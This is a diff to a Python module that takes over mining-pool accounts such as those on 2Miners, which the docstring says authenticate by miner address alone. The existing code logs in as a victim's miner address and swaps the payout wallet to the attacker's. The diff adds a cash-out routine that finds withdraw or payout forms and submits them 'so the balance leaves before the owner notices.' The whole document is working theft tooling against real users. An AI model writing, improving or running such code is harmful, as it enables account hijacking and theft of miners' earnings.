@@ -2,8 +2,9 @@
 
 Pools like 2Miners authenticate with the miner address alone, so a discovered
 target can be taken over with no credential. We warm cookies, log in, walk the
-account pages, locate the form holding the payout field, replay every field
-with our wallet substituted, then re-read the page to confirm.
+account pages, locate the form holding the payout field, replay every field with
+our wallet substituted, re-read the page to confirm, then try to fire the
+payout so the balance leaves before the owner notices.
 """
 import re
 import httpx
@@ -12,6 +13,7 @@ from bs4 import BeautifulSoup
 UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
       "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
 PAY = re.compile(r"payout|wallet|address|addr|account", re.I)
+CASH = re.compile(r"cash\s?out|payout now|pay out|withdraw|request payout", re.I)
 SKIP = {"submit", "button", "file", "reset", "image"}
 
 def _forms(html):
@@ -23,7 +25,7 @@ def _forms(html):
             out.append(f)
     return out
 
-def _payload(form, new_addr):
+def _payload(form, new_addr=None):
     data = {}
     for i in form.find_all(["input", "select", "textarea"]):
         n = i.get("name")
@@ -40,18 +42,45 @@ def _payload(form, new_addr):
                 data[n] = o.get("value") or o.text.strip()
             continue
         data[n] = i.get("value") or ""
-    for n in list(data):
-        if PAY.search(n):
-            data[n] = new_addr
+    if new_addr:
+        for n in list(data):
+            if PAY.search(n):
+                data[n] = new_addr
     return data
 
 def current_payout(html):
     soup = BeautifulSoup(html, "html.parser")
     for i in soup.find_all("input"):
-        n = (i.get("name") or "")
-        if re.search(r"payout|wallet", n, re.I):
+        if re.search(r"payout|wallet", i.get("name") or "", re.I):
             return (i.get("value") or "").strip()
     return ""
+
+async def _cashout(c, base, log):
+    for p in ("/account", "/account/payout", "/account/cashout"):
+        try:
+            r = await c.get(base + p)
+        except Exception:
+            continue
+        if r.status_code >= 400:
+            continue
+        soup = BeautifulSoup(r.text, "html.parser")
+        for f in soup.find_all("form"):
+            blob = f.get_text(" ") + " " + (f.get("action") or "")
+            if not CASH.search(blob):
+                continue
+            action = f.get("action") or p
+            url = action if action.startswith("http") else base + action
+            data = _payload(f)
+            try:
+                if (f.get("method") or "post").lower() == "post":
+                    rr = await c.post(url, data=data)
+                else:
+                    rr = await c.get(url, params=data)
+            except Exception:
+                continue
+            if rr.status_code < 400:
+                return True, url
+    return False, ""
 
 async def takeover(spec, miner, new_addr, log):
     base = "https://" + spec["host"]
@@ -67,6 +96,7 @@ async def takeover(spec, miner, new_addr, log):
             except Exception:
                 continue
         pages = ["/account", "/account/settings", "/settings", "/account/payout"]
+        confirmed = ""
         for p in pages:
             try:
                 r = await c.get(base + p)
@@ -77,10 +107,9 @@ async def takeover(spec, miner, new_addr, log):
             for f in _forms(r.text):
                 action = f.get("action") or p
                 url = action if action.startswith("http") else base + action
-                method = (f.get("method") or "post").lower()
                 data = _payload(f, new_addr)
                 try:
-                    if method == "post":
+                    if (f.get("method") or "post").lower() == "post":
                         rr = await c.post(url, data=data)
                     else:
                         rr = await c.get(url, params=data)
@@ -88,14 +117,23 @@ async def takeover(spec, miner, new_addr, log):
                     log(f"submit {url}: {type(e).__name__}")
                     continue
                 if new_addr.lower() in rr.text.lower():
-                    return "ok", f"swap applied on {url}"
+                    confirmed = f"swap applied on {url}"
+                    break
+            if confirmed:
+                break
             try:
                 v = await c.get(base + "/account")
                 if new_addr.lower() in v.text.lower():
-                    return "ok", f"swap verified from {p}"
+                    confirmed = f"swap verified from {p}"
+                    break
             except Exception:
                 pass
-        return "fail", "no payout form reachable"
+        if not confirmed:
+            return "fail", "no payout form reachable"
+        fired, where = await _cashout(c, base, log)
+        if fired:
+            return "ok", confirmed + f" + payout fired {where}"
+        return "ok", confirmed + " (payout not due)"
 
 async def probe(spec, miner):
     base = "https://" + spec["host"]
@@ -104,7 +142,6 @@ async def probe(spec, miner):
             await c.get(base + "/")
             for field in ("login", "address", "wallet"):
                 await c.post(base + spec["login"], data={field: miner})
-            r = await c.get(base + "/account")
-            return current_payout(r.text)
+            return current_payout((await c.get(base + "/account")).text)
         except Exception:
             return ""
